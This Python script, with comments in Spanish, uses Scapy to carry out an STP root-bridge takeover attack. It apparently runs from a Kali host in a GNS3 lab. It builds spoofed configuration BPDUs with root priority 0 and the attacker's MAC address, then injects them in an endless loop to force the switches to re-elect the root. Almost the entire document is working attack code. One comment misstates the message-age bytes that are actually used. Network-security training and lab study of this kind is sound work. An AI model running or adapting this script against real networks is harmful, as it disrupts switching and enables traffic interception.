#!/usr/bin/env python3
import sys
import time
import struct
from scapy.all import *

interface = "eth0"
stp_multicast = "01:80:c2:00:00:00"

print("[*] Iniciando STP Claim Root Attack en la interfaz eth0...")
print("[*] Presiona Ctrl+C para detener el ataque y restaurar la topología.\n")

try:
    mi_mac = get_if_hwaddr(interface)
    # Convertir la dirección MAC de texto a bytes puros para la carga útil
    mac_bytes = bytes.fromhex(mi_mac.replace(":", ""))
    print(f"[+] MAC Origen (Kali): {mi_mac}")
except Exception as e:
    print(f"[-] Error al acceder a la interfaz {interface}: {e}")
    sys.exit(1)

# --- CONSTRUCCIÓN SÓLIDA DE LA CARGA ÚTIL BPDU (35 BYTES) ---
# \x00\x00             -> Protocol ID: STP (0)
# \x00                 -> Version: 0
# \x00                 -> Message Type: Config BPDU (0)
# \x00                 -> Flags: 0
# \x00\x00             -> Root Priority: 0 (¡Para ganar la elección!)
# + mac_bytes          -> Root MAC (6 bytes de tu Kali)
# \x00\x00\x00\x00     -> Root Path Cost: 0
# \x00\x00             -> Bridge Priority: 0
# + mac_bytes          -> Bridge MAC (6 bytes de tu Kali)
# \x80\x01             -> Port ID: 32769 (Puerto virtual 1)
# \x00\x01             -> Message Age: 1 segundo (\x01\x00 en formato de red)
# \x00\x14             -> Max Age: 20 segundos
# \x00\x02             -> Hello Time: 2 segundos
# \x00\x0f             -> Forward Delay: 15 segundos

bpdu_payload = (
    b"\x00\x00\x00\x00\x00\x00" + 
    mac_bytes + 
    b"\x00\x00\x00\x00\x00\x00" + 
    mac_bytes + 
    b"\x80\x01\x01\x00\x00\x14\x00\x02\x00\x0f"
)

try:
    counter = 0
    while True:
        counter += 1
        
        # Ensamble perfecto de Capa 2 con cabecera LLC (802.3) estándar para STP
        packet = (
            Ether(dst=stp_multicast, src=mi_mac) /
            LLC(dsap=0x42, ssap=0x42, ctrl=3) /
            Raw(load=bpdu_payload)
        )
        
        # Inyección forzada en el cable virtual de GNS3
        sendp(packet, iface=interface, verbose=False, realtime=True)
        
        if counter % 5 == 0:
            print(f"[+] {counter} BPDUs inyectadas con éxito. Forzando cambio de rol...")
            
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Ataque finalizado por el operador.")
    sys.exit(0)
